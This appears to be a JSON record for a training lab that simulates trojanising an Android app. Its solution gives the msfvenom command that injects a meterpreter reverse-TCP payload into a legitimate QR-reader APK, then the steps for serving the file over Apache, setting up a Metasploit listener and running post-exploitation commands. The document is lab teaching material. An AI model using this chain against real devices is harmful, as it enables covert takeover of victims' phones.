{"description":"","goal":"<h1>Dockerized Android with Metasploit</h1>\n<p>This lab aims to simulate an attack scenario against Android devices. We have a subnet with an android device (Galaxy S8 by default), that represent the victim, and a kali machine, that represent the attacker, inside.</p>\n<p>Briefly, we will use msfvenom to create a payload, inject it in a legitimate app and save as an apk file. After that, we need to setup a listener to Metasploit framework. Once the target downloads and installs the malicious apk then, an attacker can easily get back a meterpreter session on Metasploit.</p>\n<p>Metasploit make available different types of android payloads that can be discovered by typing on msf console:</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp; <code>sudo </code><code><span class=\"_2PHJq public-DraftStyleDefault-ltr\">search type:payload platform:android</span></code></p>\n<p>In this lab we will use <strong>android/meterpreter/reverse_tcp </strong>payload in order to run a meterpreter server into android device.</p>\n<h3>Requirements</h3>\n<p>&nbsp;Your machine need to support virtualization. To check it:</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp; <code>sudo apt install cpu-checker</code><br /><br />&nbsp; &nbsp;&nbsp; <code>kvm-ok</code> <br /><br /> <br />To use android device open the browser and check http://localhost:6081.</p>","solution":"<h1>Attack scenario</h1>\n<h4>On Kali</h4>\n<h5>Create malicious apk</h5>\n<p>&nbsp;1. Run:</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code> $ msfvenom -p android/meterpreter/reverse_tcp -x app/QRcodeReader.apk LHOST=172.16.238.10 LPORT=4444 -o malware.apk</code></p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp; where:</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - <span class=\"_2PHJq public-DraftStyleDefault-ltr\"><strong>msfvenom </strong>the command to create the malicious payload</span></p>\n<p><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - android/meterpreter_reverse_tcp </strong>the name of the android payload with <strong>-p</strong> option<br /></span></span></p>\n<p><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - app/QRcodeReader.apk</strong> the legitimate app to inject with <strong>-x</strong> option</span></span></span></p>\n<p><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - LHOST=172.16.238.10</strong> the IP address of the attacker (Kali)</span></span></span></p>\n<p><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - LPORT=4444 </strong>the port to communicate back to the attacker</span></span></span></span></p>\n<p><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><span class=\"_2PHJq public-DraftStyleDefault-ltr\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp; malware.apk </strong>the name of the app to output with <strong>-o</strong> option<br /></span></span></span></span></span></p>\n<p>&nbsp;2. Move generated malware.apk into apache server directory /var/www/html with this command:<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code> $ mv malware.apk /var/www/html</code></p>\n<p>&nbsp;3. Run apache2 server:</p>\n<p><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>&nbsp; $ service apache2 start</code></p>\n<p>&nbsp;</p>\n<h5>Configure metasploit listener</h5>\n<p>&nbsp;1. Go on kali and run metasploit-framework:</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code> $ msfconsole</code></p>\n<p>&nbsp;2. Set generic handler:</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code> $ use multi/handler<br /></code></p>\n<p>&nbsp;3. Set payload type:</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code> $ set PAYLOAD android/meterpreter/reverse_tcp</code></p>\n<p>&nbsp; 4. Set LHOST:<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code> $ set LHOST 172.16.238.10</code></p>\n<p>&nbsp;5. Set LPORT:</p>\n<p><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>&nbsp; $ </code><code>set LPORT 4444<br /></code></p>\n<p>&nbsp;6. Run exploit:</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code> $ exploit\n</code></p>\n<p>&nbsp;7. Well done! Now you can wait victim install the apk file.</p>\n<p>&nbsp;</p>\n<h4>On Android Device</h4>\n<ol>\n<li>On android devices open browser, type 172.16.238.10/malware.apk and download the app.</li>\n<li>Install malware.apk enabling unknown sources from setting menu.</li>\n<li>Open the app!</li>\n</ol>\n<p>&nbsp;</p>\n<h4>Post Exploit</h4>\n<p>&nbsp;1.On kali machine you can see new session opened and use meterpreter prompt. T<span class=\"_2PHJq public-DraftStyleDefault-ltr\">o see all the Android meterpreter commands run:<br /></span></p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code> $ help\n\n</code></p>\n<p>&nbsp;2. Run app_list to show all app installed on victim device:</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code> $ app_list\n</code></p>\n<p><code></code></p>\n<p><code></code></p>","readme":"\n","author":"felsant"}
